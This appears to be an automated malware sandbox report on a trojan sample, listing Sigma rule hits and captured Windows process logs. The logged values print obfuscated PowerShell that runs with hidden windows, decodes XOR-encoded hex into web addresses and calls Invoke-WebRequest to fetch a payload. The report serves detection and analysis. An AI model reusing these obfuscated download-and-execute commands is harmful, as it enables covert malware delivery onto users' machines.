threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

attributes.magic: Zip archive data, at least v2.0 to extract, compression method=store

sigma_analysis_results.rule_description: Detects TOKEN OBFUSCATION technique from Invoke-Obfuscation
Detects presence of a potentially xor encoded powershell command
sigma_analysis_results.rule_author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali

match_context.values: @{Hashes=SHA1=3D6861E137699ADD6E1DB51E2F9D96A9FC4F122D,MD5=1089F6E6C6C219009F75C637ED302F99,SHA256=5A1D9329C862C908B050896FEFA49628D00A914EE2155CEFCAA7704BD1A5E2C8,IMPHASH=FF24CEF596AA4AA9D65391184A89D008; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentCommandLine=POWErSHeLl  -ENc  " [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -w hidden -Command "$DATa = ([TEXt.EnCODINg]::UTF8.GeTStrING((&(\"{0}{1}{2}\" -F [ChaR]((64 + 9)),[chaR]((114 - 27)),[cHAR]((84 - 2))) (-join ([regex]::Matches(\"0519191D1E57424206041E000C030002430E02004219425E580B55590E085B54590B5A0F550B095E5C0B590C595409545A0F090E0C585C0C5A5A59545B0E545A5D5B585A0C585D095B585A0E0C580E0E5C5D5B5A5B0E5D\", \"..\") | %% { [char]([convert]::ToByte($_.Value, (97 - 81)) -bxor (80 + 29)) })) -UsEBaS [TRUNCATED]; EventID=1; ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Hashes=SHA1=3D6861E137699ADD6E1DB51E2F9D96A9FC4F122D,MD5=1089F6E6C6C219009F75C637ED302F99,SHA256=5A1D9329C862C908B050896FEFA49628D00A914EE2155CEFCAA7704BD1A5E2C8,IMPHASH=FF24CEF596AA4AA9D65391184A89D008; Description=Windows PowerShell; EventID=1; ParentCommandLine=POWERShELl  -eNC  " [TRUNCATED]; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -w hidden -Command "$DaTa = ([TEXt.EnCoDinG]::UTF8.GeTSTRiNG((&(\"{0}{1}{2}\" -F [cHAr]((104 - 31)),[ChaR]((160 - 73)),[ChAr]((94 - 12))) (-join ([regex]::Matches(\"18040400034A5F5F1B19031D111E1D1F5E131F1D5F045F15434111431616114014124640154314164441421313441143434349164941114141431114484415404245464043484543474742431148404414161344461540\", \"..\") | %% { [char]([convert]::ToByte($_.Value, (76 - 60)) -bxor (24 + 88)) })) -USe [TRUNCATED]; FileVersion=10.0.22621.2361 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may use hidden windows to conceal malicious activity from the plain sight of users.
In some cases, windows that would typically be displayed when an application carries out an operation can be hidden

match_context.values: @{ScriptBlockText=Start-Process -FilePath "powershell.exe" -WindowStyle Hidden  -ArgumentList '-NoProfile -w hidden -Command "$DATa = ([TEXt.EnCODINg]::UTF8.GeTStrING((&(\"{0}{1}{2}\" -F [ChaR]((64 + 9)),[chaR]((114 - 27)),[cHAR]((84 - 2))) (-join ([regex]::Matches(\"0519191D1E57424206041E000C030002430E02004219425E580B55590E085B54590B5A0F550B095E5C0B590C595409545A0F090E0C585C0C5A5A59545B0E545A5D5B585A0C585D095B585A0E0C580E0E5C5D5B5A5B0E5D\", \"..\") | % { [char]([convert]::ToByte($_.Value, (97 - 81)) -bxor (80 +  [TRUNCATED]; Path=; ScriptBlockId=f0f25b3f-aca6-43b8-96db-f9a1270e052d; MessageTotal=1; EventID=4104; MessageNumber=1}

sigma_analysis_results.rule_title: Suspicious Execution of Powershell with Base64
sigma_analysis_results.rule_description: Commandline to launch powershell with a base64 payload

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.
